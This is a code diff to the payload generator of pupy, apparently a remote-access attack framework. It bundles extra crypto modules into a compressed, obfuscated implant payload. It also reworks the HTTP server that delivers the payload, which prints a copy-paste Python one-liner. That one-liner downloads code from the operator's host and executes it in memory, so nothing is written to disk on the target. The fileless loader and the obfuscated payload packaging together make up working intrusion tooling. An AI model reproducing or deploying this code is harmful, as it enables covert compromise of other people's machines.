@@ -5,7 +5,7 @@
 
 from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
 import cPickle, re, os.path
-import rpyc
+import rpyc, rsa, pyasn1
 from pupylib.utils.obfuscate import compress_encode_obfs
 from pupylib.utils.term import colorize
 from pupylib.utils.network import get_local_ip
@@ -27,6 +27,12 @@ def pack_py_payload(conf):
     modules_dic=gen_package_pickled_dic(os.path.join(ROOT,"network"),"network")
     fullpayload.append("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(modules_dic)))
 
+    modules_dic=gen_package_pickled_dic(pyasn1.__path__[0],"pyasn1")
+    fullpayload.append("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(modules_dic)))
+
+    modules_dic=gen_package_pickled_dic(rsa.__path__[0],"rsa")
+    fullpayload.append("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(modules_dic)))
+
     with open(os.path.join(ROOT,"pp.py")) as f:
         code=f.read()
     code=re.sub(r"LAUNCHER=.*\nLAUNCHER_ARGS=.*", conf, code)
@@ -35,12 +41,7 @@ def pack_py_payload(conf):
     return compress_encode_obfs('\n'.join(fullpayload)+"\n")
 
 
-def serve_payload(payload, ip="0.0.0.0", port=8080):
-    print colorize("[+] ","green")+"copy/paste this one-line loader to deploy pupy without writing on the disk :"
-    print " --- "
-    oneliner=colorize("python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s/index\").read()'"%(get_local_ip(), port), "green")
-    print oneliner
-    print " --- "
+def serve_payload(payload, ip="0.0.0.0", port=8080, link_ip="<your_ip>"):
     class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
         def do_GET(self):
             self.send_response(200)
@@ -50,8 +51,23 @@ def serve_payload(payload, ip="0.0.0.0", port=8080):
             self.wfile.write(payload)
             return
     try:
-        server = HTTPServer((ip, port), PupyPayloadHTTPHandler)
-        print colorize("[+] ","green")+'Started httpserver on port ' , port
+        while True:
+            try:
+                server = HTTPServer((ip, port), PupyPayloadHTTPHandler)
+                break
+            except Exception as e:
+                # [Errno 98] Adress already in use
+                if e[0] == 98:
+                    port+=1
+                else:
+                    raise
+        print colorize("[+] ","green")+"copy/paste this one-line loader to deploy pupy without writing on the disk :"
+        print " --- "
+        oneliner=colorize("python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s/index\").read()'"%(link_ip, port), "green")
+        print oneliner
+        print " --- "
+
+        print colorize("[+] ","green")+'Started http server on %s:%s '%(ip, port)
         print colorize("[+] ","green")+'waiting for a connection ...'
         server.serve_forever()
     except KeyboardInterrupt:
